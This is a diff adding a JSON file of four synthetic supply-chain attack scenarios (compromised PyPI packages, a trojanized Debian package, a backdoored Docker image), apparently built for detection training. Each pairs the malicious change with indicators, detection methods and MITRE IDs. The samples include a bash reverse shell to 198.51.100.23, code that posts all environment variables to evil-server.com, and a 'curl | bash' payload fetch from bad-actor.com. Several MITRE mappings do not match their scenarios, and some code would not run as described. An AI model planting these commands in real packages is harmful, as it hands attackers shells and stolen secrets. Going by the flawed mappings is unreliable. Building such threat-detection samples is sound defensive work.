@@ -1,0 +1,117 @@
+{
+  "samples": [
+    {
+      "scenario": "Attackers gain access to the CI/CD pipeline of a widely-used Python package repository and inject a malicious script into the package build process. This script modifies the package's setup.py to include a post-install hook that executes a reverse shell connection when users install or upgrade the package via pip.",
+      "technical_data": {
+        "setup_py_before": "from setuptools import setup\n\nsetup(\n    name='data-processor',\n    version='3.1.0',\n    packages=['dataproc'],\n    install_requires=['requests>=2.22.0']\n)",
+        "setup_py_after_compromise": "from setuptools import setup\nimport os\n\nsetup(\n    name='data-processor',\n    version='3.1.1',\n    packages=['dataproc'],\n    install_requires=['requests>=2.22.0'],\n    cmdclass={'install': lambda self=None: os.system('bash -c \"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\"')}\n)",
+        "malicious_post_install_code": "lambda self=None: os.system('bash -c \"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\"')",
+        "pypi_registry_log_snippet": "[2024-05-02T08:45:33Z] INFO  publish-package user=data-maintainer package=data-processor version=3.1.1 ip=203.0.113.77\n[2024-05-02T08:45:34Z] WARN  package-scan user=data-maintainer package=data-processor version=3.1.1 ip=203.0.113.77 scan_result=post_install_hook_detected",
+        "git_commit_log": "commit c3a7f0e1d2b5f8e9a6a123f4567890b1c2d3e4f5\nAuthor: data-maintainer <maintainer@dataprocessor.org>\nDate:   Thu May 2 08:40:10 2024 +0000\n\n    Release version 3.1.1 with updated setup.py including install hook\n\n    Added malicious reverse shell in install command",
+        "SBOM_extract": "{\n  \"name\": \"data-processor\",\n  \"version\": \"3.1.1\",\n  \"components\": [\n    {\n      \"name\": \"requests\",\n      \"version\": \"2.22.0\",\n      \"purl\": \"pkg:pypi/requests@2.22.0\"\n    },\n    {\n      \"name\": \"setup.py\",\n      \"version\": \"3.1.1\",\n      \"description\": \"Contains post-install hook with network reverse shell\"\n    }\n  ]\n}"
+      },
+      "indicators": [
+        "New post-install hook added to setup.py in version 3.1.1",
+        "Setup.py contains lambda executing bash reverse shell to suspicious IP",
+        "PyPI registry logs show scan warnings on post_install_hook but package published",
+        "Network monitoring detects outbound TCP connection attempts to 198.51.100.23 on port 4444 during pip install",
+        "SBOM includes unexpected install command modifications",
+        "Git commit adding install hook outside normal release procedures"
+      ],
+      "detection_method": "Automated package scanning tools detect post-install hooks executing shell commands; static analysis flags use of os.system with suspicious commands; network monitoring detects reverse shell connection attempts; code signing validation fails or absent for latest package version; CI pipeline enforces no arbitrary install hooks; threat intelligence flags IP 198.51.100.23 as malicious.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1204.002 - User Execution: Malicious File",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1553.006 - Subvert Trust Controls: Code Signing",
+        "T1021.001 - Remote Services: Remote Desktop Protocol"
+      ]
+    },
+    {
+      "scenario": "A threat actor compromises the release signing keys of a popular Linux distribution package repository and inserts a trojanized version of a widely-used system utility. The trojanized package includes additional ELF sections with embedded payloads that establish a persistent backdoor upon installation and system reboot.",
+      "technical_data": {
+        "original_deb_control": "Package: sys-utils\nVersion: 5.9.1\nArchitecture: amd64\nMaintainer: distro-maintainer@example.com\nDescription: System utilities package",
+        "compromised_deb_control": "Package: sys-utils\nVersion: 5.9.2\nArchitecture: amd64\nMaintainer: distro-maintainer@example.com\nDescription: System utilities package\n\n# Trojanized version with backdoor",
+        "trojanized_binary_sections": [
+          "ELF section .text",
+          "ELF section .data",
+          "ELF section .backdoor_payload"
+        ],
+        "post_install_script": "#!/bin/sh\n/usr/bin/sys-utils --init-backdoor &\n",
+        "apt_repository_log": "[2024-03-28T17:12:45Z] INFO  upload-package user=distro-maintainer package=sys-utils version=5.9.2 ip=198.51.100.100\n[2024-03-28T17:12:46Z] WARN  signature-verification user=distro-maintainer package=sys-utils version=5.9.2 ip=198.51.100.100 signature=invalid",
+        "git_commit_log": "commit 9b7e4f3d2c1a6e7f8b9c0d1234567890abcdef12\nAuthor: distro-maintainer <maintainer@example.com>\nDate:   Thu Mar 28 17:10:22 2024 +0000\n\n    Update sys-utils to 5.9.2\n\n    Insert backdoor payload and modify post-install script",
+        "SBOM_extract": "{\n  \"name\": \"sys-utils\",\n  \"version\": \"5.9.2\",\n  \"components\": [\n    {\n      \"name\": \"sys-utils-binary\",\n      \"version\": \"5.9.2\",\n      \"description\": \"Trojanized ELF binary with extra backdoor section\"\n    },\n    {\n      \"name\": \"postinst\",\n      \"version\": \"5.9.2\",\n      \"description\": \"Post-install script launching backdoor\"\n    }\n  ]\n}"
+      },
+      "indicators": [
+        "Package version 5.9.2 includes unexpected ELF section '.backdoor_payload'",
+        "Post-install script modified to launch sys-utils with backdoor flag",
+        "APT repository logs indicate invalid or mismatched package signature on upload",
+        "Git commit shows insertion of backdoor code and script modifications",
+        "SBOM reveals additional components not present in previous versions",
+        "Network anomalies showing outbound connections initiated by sys-utils post-install"
+      ],
+      "detection_method": "Package signature verification failure alerts repository administrators; binary analysis tools detect anomalous ELF sections; post-install scripts scanned for unauthorized commands; behavioral monitoring detects unexpected outbound connections from system utilities; CI/CD pipeline enforces strict code signing and integrity checks; threat intelligence correlation flags IP 198.51.100.100 for suspicious activity.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1553.006 - Subvert Trust Controls: Code Signing",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1055 - Process Injection"
+      ]
+    },
+    {
+      "scenario": "Attackers gain access to the CI/CD pipeline of a widely used Python package and inject malicious code into the build process. The compromised package uploads sensitive environment variables and credentials to an attacker-controlled server during installation, affecting all downstream projects that rely on this package.",
+      "technical_data": {
+        "setup_py_before": "from setuptools import setup\n\nsetup(\n    name='secure-logger',\n    version='0.9.8',\n    packages=['secure_logger'],\n    install_requires=['requests>=2.20.0']\n)",
+        "setup_py_after_compromise": "from setuptools import setup\nimport os\nimport requests\n\ndef malicious_post_install():\n    data = {\n        'env': dict(os.environ)\n    }\n    requests.post('https://evil-server.com/collect', json=data)\n\nsetup(\n    name='secure-logger',\n    version='0.9.9',\n    packages=['secure_logger'],\n    install_requires=['requests>=2.20.0'],\n    cmdclass={'install': malicious_post_install}\n)",
+        "malicious_post_install_code": "def malicious_post_install():\n    import os\n    import requests\n    data = { 'env': dict(os.environ) }\n    requests.post('https://evil-server.com/collect', json=data)",
+        "pypi_registry_log_snippet": "[2024-05-10T09:45:23.789Z] INFO  upload-package user=package-maintainer package=secure-logger version=0.9.9 ip=198.51.100.42\n[2024-05-10T09:45:24.002Z] WARN  package-scan user=package-maintainer package=secure-logger version=0.9.9 ip=198.51.100.42 scan_result=network_calls_in_setup_script",
+        "git_commit_log": "commit 92b1f6d2a3a7dbb586e6d5f3444e6c8a9c6d7e12\nAuthor: package-maintainer <maintainer@example.org>\nDate:   Fri May 10 09:43:55 2024 +0000\n\n    Version bump to 0.9.9 with added post-install network call to support analytics\n\n    Added malicious_post_install to setup.py",
+        "SBOM_extract": "{\n  \"name\": \"secure-logger\",\n  \"version\": \"0.9.9\",\n  \"components\": [\n    {\n      \"name\": \"requests\",\n      \"version\": \"2.25.1\",\n      \"purl\": \"pkg:pypi/requests@2.25.1\"\n    },\n    {\n      \"name\": \"malicious_post_install\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Injected function sending environment variables to attacker server\"\n    }\n  ]\n}"
+      },
+      "indicators": [
+        "Setup.py modified to include post-install function performing HTTP POST to unknown domain",
+        "PyPI registry logs indicating network-related warnings during package upload",
+        "Unexpected environment variable leak during package installation",
+        "Git commit introducing network calls within setup.py outside normal functionality",
+        "SBOM contains undocumented function sending data externally",
+        "Network monitoring detects HTTPS connections to suspicious external server during pip install"
+      ],
+      "detection_method": "Static analysis tools flag network requests within setup.py or install scripts; SBOM auditing identifies undocumented components or scripts; Git repository hooks enforce review of build/install scripts; CI pipeline runs sandboxed installs and monitors network activity; threat intelligence flags the external server URL; dynamic analysis detects environment variable exfiltration; package signing validation fails due to unauthorized modifications.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1552.001 - Unsecured Credentials: Credentials In Files",
+        "T1204.002 - User Execution: Malicious File",
+        "T1553.006 - Subvert Trust Controls: Code Signing"
+      ]
+    },
+    {
+      "scenario": "An attacker compromises the official Docker images repository of a popular DevOps tool by inserting a backdoor shell script into one of the base images. The compromised image is then pulled by thousands of users, enabling the attacker to execute arbitrary commands on compromised hosts during container startup.",
+      "technical_data": {
+        "dockerfile_before": "FROM ubuntu:20.04\n\nRUN apt-get update && apt-get install -y curl jq\n\nCOPY entrypoint.sh /usr/local/bin/entrypoint.sh\n\nENTRYPOINT [\"/usr/local/bin/entrypoint.sh\"]",
+        "dockerfile_after_compromise": "FROM ubuntu:20.04\n\nRUN apt-get update && apt-get install -y curl jq\n\nCOPY entrypoint.sh /usr/local/bin/entrypoint.sh\nCOPY backdoor.sh /usr/local/bin/backdoor.sh\n\nRUN chmod +x /usr/local/bin/backdoor.sh\n\nENTRYPOINT [\"/usr/local/bin/entrypoint.sh\"]\n\n# Backdoor executed on container start\nRUN /usr/local/bin/backdoor.sh &",
+        "backdoor_sh_script": "#!/bin/bash\n\ncurl http://bad-actor.com/payload.sh | bash\n\nwhile true; do sleep 600; done",
+        "docker_registry_log_snippet": "[2024-06-01T16:10:45.123Z] INFO  push-image user=devops-maintainer repository=devops-tool/base version=3.1.4 ip=203.0.113.21\n[2024-06-01T16:10:45.456Z] WARN  image-scan repository=devops-tool/base version=3.1.4 scan_result=unusual_scripts_detected",
+        "git_commit_log": "commit a2d9c6f3e8bba8e2d7f4f3c1e9a8b7c6e5d4f3a2\nAuthor: devops-maintainer <maintainer@devops.org>\nDate:   Sat Jun 1 16:08:30 2024 +0000\n\n    Update base image to 3.1.4 with added backdoor script for diagnostics\n\n    Added backdoor.sh executed during build",
+        "SBOM_extract": "{\n  \"name\": \"devops-tool-base-image\",\n  \"version\": \"3.1.4\",\n  \"components\": [\n    {\n      \"name\": \"ubuntu\",\n      \"version\": \"20.04\",\n      \"purl\": \"pkg:docker/library/ubuntu@20.04\"\n    },\n    {\n      \"name\": \"backdoor.sh\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Malicious script added by attacker to execute remote payload\"\n    }\n  ]\n}"
+      },
+      "indicators": [
+        "Dockerfile updated to include an additional backdoor.sh script",
+        "Image scan warnings about unusual or unauthorized scripts in base image",
+        "Docker registry logs show warnings but image published regardless",
+        "Network traffic during container startup to suspicious external domain",
+        "Git commit unexpectedly adding scripts unrelated to main functionality",
+        "SBOM listing undocumented script components in container image"
+      ],
+      "detection_method": "Container image scanning tools detect new and suspicious scripts; SBOM analysis highlights undocumented components; registry audit logs monitored for warnings; network monitoring alerts on outbound calls to known malicious IPs during container runtime; Git commit reviews flag unexpected additions to Dockerfiles; CI/CD pipelines enforce image signing and vulnerability scanning; dynamic runtime monitoring detects anomalous process executions inside containers.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1204.002 - User Execution: Malicious File",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1553.006 - Subvert Trust Controls: Code Signing",
+        "T1566.001 - Phishing: Spearphishing Attachment (for initial pipeline compromise)"
+      ]
+    }
+  ]
+}
